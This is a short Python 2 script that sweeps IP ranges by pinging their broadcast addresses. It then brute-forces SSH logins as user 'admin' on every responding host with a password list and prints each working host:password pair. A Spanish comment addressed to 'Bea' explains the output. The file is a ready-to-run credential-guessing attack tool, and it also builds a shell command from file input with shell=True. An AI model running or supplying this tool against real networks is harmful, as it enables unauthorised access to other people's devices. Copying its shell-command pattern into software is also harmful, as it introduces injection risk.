#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import subprocess
import ipaddress
import re
import collections
import paramiko


def getnetwaddress():

    """
        Open the file to get the IP range assuming format A.B.C.D /8,12,etc
    """
    try:
        addresses = list()
        with open('iprange.txt', 'r') as fil:
            for ip_add in fil:
                ip_add = re.search(r'[^\r ^\n]*', unicode(ip_add, "utf-8"))
                ip_add = ipaddress.ip_network(ip_add.group())
                broadcast_address = ip_add.broadcast_address
                proc = subprocess.Popen("ping -c 2 -b " + str(broadcast_address), stdout=subprocess.PIPE, shell=True)
            	(out,err)= proc.communicate()
                for line in out.splitlines():
                    matches = re.search(r'^\d+ bytes from (?P<IP>.*): icmp_req=\d ttl=\d+ time=.*$', line, re.MULTILINE)
                    if matches:
                        addresses.append(matches.group('IP'))

        iplist = [item for item, count in collections.Counter(addresses).items() if count == 1]

        return iplist
    except IOError:
        print "The file with the IP range doesn't exist"
    except ValueError:
        print "IP range not valid"


def scandpassword():
    iplist = getnetwaddress()
    passwords = list()
    with open('password.txt', 'r') as passwo:
        for line in passwo:
            passwords.append(line.replace("\r\n", ""))
    passwordss = list()
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for address in iplist:
        for pas in passwords:
            try:
                print "Trying connection with device " + address + " password " + pas
                ssh_client.connect(hostname=address,
                                   username='admin',
                                   password=pas)
                passwordss.append([address, pas])
                print "Success"
            except Exception as e:
                print "Fail"
                continue
    for i in passwordss:
        print i[0]+":"+i[1]
    return passwordss
""""
    Bea, la función scandpassword hace el ping y devuelve una lista de dos dimensiones tal que [host contraseña]
"""
